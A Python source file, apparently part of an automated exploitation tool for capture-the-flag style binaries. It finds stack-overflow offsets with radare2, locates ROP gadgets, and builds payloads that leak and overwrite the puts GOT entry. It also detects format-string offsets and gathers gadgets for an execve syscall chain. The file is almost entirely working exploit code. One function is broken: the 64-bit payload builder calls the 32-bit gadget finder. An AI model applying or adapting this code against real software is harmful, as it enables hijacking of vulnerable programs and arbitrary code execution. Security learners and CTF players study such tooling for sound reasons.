from pwn import *
import subprocess

def determine_offset_to_ebp(challenge_info):
    binary_name = challenge_info["binary_name"]
    elf = challenge_info["elf"]
    offset_to_ebp = 10000000
    num_junk_inputs = -1
    for i in range(5):
        try:
            pattern_file = open("pattern.txt", "w")
            for j in range(i):
                pattern_file.write("@\n")
            ragg2_proc = subprocess.Popen(["ragg2", "-P", "400", "-r"], stdout=pattern_file)
            pattern_file.close()

            profile_file = open("profile.rr2", "w")
            profile_file.write("!/usr/bin/rarun2\n")
            profile_file.write("stdin=./pattern.txt\n")
            profile_file.close()

            r2log_file = open("r2log", "w")

            r2_proc = subprocess.Popen(["r2", "-r", "profile.rr2", "-d", binary_name], stdin=subprocess.PIPE, stdout=r2log_file)

            if elf.bits == 32:
                r2_proc.communicate(input=b"dc\nwopO `dr ebp`\n")
            else:
                r2_proc.communicate(input=b"dc\nwopO `dr rbp`\n")

            r2log_file.close()

            r2log_file = open("r2log", "r")

            lines = r2log_file.readlines()
            new_offset = int(list(reversed(lines))[6].strip())
            if (new_offset > -1) and (new_offset < offset_to_ebp):
                offset_to_ebp = new_offset
                num_junk_inputs = i
        except:
            print(str(i) + " is too many junk lines")
    return offset_to_ebp, num_junk_inputs

def readleak32(resp, putoff):
    findme = bytes([putoff % 256])
    addrstart = resp.find(findme)
    countme = resp.count(findme)
    if countme > 1:
        print("MANY FOUND...")
        winner = addrstart
        nextnibble = (putoff >> 8) % 16
        foundOne = False
        for ii in range(countme):
            if resp[winner+1] % 16 == nextnibble:
                foundOne = True
                break
            else:
                winner = resp.find(findme, winner + 1)
        if foundOne:
            addrstart = winner
        else:
            print("Failed to find leak")
    return u32(resp[addrstart:addrstart + 4])

def readleak64(resp, putoff):
    findme = bytes([putoff % 256])
    addrstart = resp.find(findme)
    return u64(resp[addrstart:addrstart + 6]+b'\x00\x00')

def find_gadgets32(binary_name):
    p1 = subprocess.Popen(["ROPgadget", "--binary", binary_name], stdout=subprocess.PIPE)
    p2 = subprocess.Popen(["grep", "-x" ,".\{26\}"], stdin=p1.stdout, stdout=subprocess.PIPE)
    p3 = subprocess.run(["grep", "-m", "1", "pop ebx"], stdin=p2.stdout ,stdout=subprocess.PIPE)
    pop_ebx_address = p3.stdout[:10]
    pop_ebx_address = int(pop_ebx_address, 16)
    return pop_ebx_address

def find_gadgets64(binary_name):
    p1 = subprocess.Popen(["ROPgadget", "--binary", binary_name], stdout=subprocess.PIPE)
    p2 = subprocess.Popen(["grep", "-x" ,".\{34\}"], stdin=p1.stdout, stdout=subprocess.PIPE)
    p3 = subprocess.run(["grep", "-m", "1", "pop rdi"], stdin=p2.stdout ,stdout=subprocess.PIPE)
    pop_rdi_address = p3.stdout[:18]
    pop_rdi_address = int(pop_rdi_address, 16)

    p1 = subprocess.Popen(["ROPgadget", "--binary", binary_name], stdout=subprocess.PIPE)
    p2 = subprocess.Popen(["grep", "-x" ,".\{24\}"], stdin=p1.stdout, stdout=subprocess.PIPE)
    p3 = subprocess.run(["grep", "-m", "1", "ret"], stdin=p2.stdout ,stdout=subprocess.PIPE)
    ret_address = p3.stdout[:18]
    ret_address = int(ret_address, 16)

    return pop_rdi_address, ret_address

def sledgehammer32_payload1_after_offset(challenge_info):
    binary_name = challenge_info["binary_name"]
    elf = challenge_info["elf"]
    pop_ebx_address = find_gadgets32(binary_name)
    payload = p32(elf.plt["puts"]) + p32(pop_ebx_address) + p32(elf.got["puts"])
    payload += p32(elf.plt["gets"]) + p32(pop_ebx_address) + p32(elf.got["puts"])
    payload += p32(elf.plt["gets"]) + p32(pop_ebx_address) + p32(elf.got["puts"]-0x10)
    payload += p32(elf.plt["puts"]) + p32(pop_ebx_address) + p32(elf.got["puts"]-0x10)
    return payload

def sledgehammer64_payload1_after_offset(challenge_info):
    binary_name = challenge_info["binary_name"]
    elf = challenge_info["elf"]
    pop_rdi_address, ret_address = find_gadgets32(binary_name)
    payload = (p64(pop_rdi_address) + p64(elf.got["puts"])) + p64(elf.plt["puts"])
    payload += (p64(pop_rdi_address) + p64(elf.got["puts"])) + p64(elf.plt["gets"])
    payload += (p64(pop_rdi_address) + p64(elf.got["puts"]-0x10)) + p64(elf.plt["gets"])
    payload += (p64(pop_rdi_address) + p64(elf.got["puts"]-0x10)) + p64(ret_address) + p64(elf.plt["puts"])
    return payload

def determine_printf_offset(binary_name):
    offset = 10000000
    num_junk_inputs = -1
    for i in range(5):
        def exec_fmt(payload):
            p = process(binary_name)
            p.recv()
            for j in range(i):
                p.sendline("junk")
            p.sendline(payload)
            output = p.recvall()
            print(output)
            return output

        try:
            autofmt = FmtStr(exec_fmt)
            new_offset = autofmt.offset
            if (new_offset > -1) and (new_offset < offset):
                offset = new_offset
                num_junk_inputs = i
        except:
            print(str(i) + " is too many junk lines")
    
    return offset, num_junk_inputs

def find_execve_gadgets(binary_name):
    # for 64-bit:
    # need syscall gadget
    # need pop for rdi, rdx, rax, or rsi
    # ^ ideally individual, but some combinations may easily work too
    # need something that does mov qword ptr [rdi], reg ; ret
    # where reg is any register that can be controlled

    # ^^ These are the general constraints. Right now this function
    # only works for 64 bit and if individual pop gadgets exist

    print("searching for execve gadgets...")

    try:
        p1 = subprocess.Popen(["ROPgadget", "--binary", binary_name], stdout=subprocess.PIPE)
        p2 = subprocess.Popen(["grep", "-x" ,".\{28\}"], stdin=p1.stdout, stdout=subprocess.PIPE)
        p3 = subprocess.run(["grep", "-m", "1", "syscall"], stdin=p2.stdout ,stdout=subprocess.PIPE)
        syscall_gadget_address = p3.stdout[:18]
        syscall_gadget_address = int(syscall_gadget_address, 16)

        p1 = subprocess.Popen(["ROPgadget", "--binary", binary_name], stdout=subprocess.PIPE)
        p2 = subprocess.Popen(["grep", "-x" ,".\{34\}"], stdin=p1.stdout, stdout=subprocess.PIPE)
        p3 = subprocess.run(["grep", "-m", "1", "pop rdi"], stdin=p2.stdout ,stdout=subprocess.PIPE)
        pop_rdi_address = p3.stdout[:18]
        pop_rdi_address = int(pop_rdi_address, 16)

        p1 = subprocess.Popen(["ROPgadget", "--binary", binary_name], stdout=subprocess.PIPE)
        p2 = subprocess.Popen(["grep", "-x" ,".\{34\}"], stdin=p1.stdout, stdout=subprocess.PIPE)
        p3 = subprocess.run(["grep", "-m", "1", "pop rdx"], stdin=p2.stdout ,stdout=subprocess.PIPE)
        pop_rdx_address = p3.stdout[:18]
        pop_rdx_address = int(pop_rdx_address, 16)

        p1 = subprocess.Popen(["ROPgadget", "--binary", binary_name], stdout=subprocess.PIPE)
        p2 = subprocess.Popen(["grep", "-x" ,".\{34\}"], stdin=p1.stdout, stdout=subprocess.PIPE)
        p3 = subprocess.run(["grep", "-m", "1", "pop rax"], stdin=p2.stdout ,stdout=subprocess.PIPE)
        pop_rax_address = p3.stdout[:18]
        pop_rax_address = int(pop_rax_address, 16)

        p1 = subprocess.Popen(["ROPgadget", "--binary", binary_name], stdout=subprocess.PIPE)
        p2 = subprocess.Popen(["grep", "-x" ,".\{34\}"], stdin=p1.stdout, stdout=subprocess.PIPE)
        p3 = subprocess.run(["grep", "-m", "1", "pop rsi"], stdin=p2.stdout ,stdout=subprocess.PIPE)
        pop_rsi_address = p3.stdout[:18]
        pop_rsi_address = int(pop_rsi_address, 16)

        p1 = subprocess.Popen(["ROPgadget", "--binary", binary_name], stdout=subprocess.PIPE)
        p2 = subprocess.Popen(["grep", "-x" ,".\{51\}"], stdin=p1.stdout, stdout=subprocess.PIPE)
        p3 = subprocess.run(["grep", "mov qword ptr \[rdi\], rdx"], stdin=p2.stdout ,stdout=subprocess.PIPE)
        # above line is over-specific -- could replace rdi with ..., then would have to
        # determine what register is in the brackets. Then would have to make sure there
        # is a pop gadget for that register
        mov_rdx_into_address_stored_in_rdi = p3.stdout[:18]
        mov_rdx_into_address_stored_in_rdi = int(mov_rdx_into_address_stored_in_rdi, 16)

        return {"syscall_gadget_address": syscall_gadget_address,
            "pop_rdi_address": pop_rdi_address,
            "pop_rdx_address": pop_rdx_address,
            "pop_rax_address": pop_rax_address,
            "pop_rsi_address": pop_rsi_address,
            "mov_rdx_into_address_stored_in_rdi": mov_rdx_into_address_stored_in_rdi}
    
    except Exception as e:
        print(e)
        return -1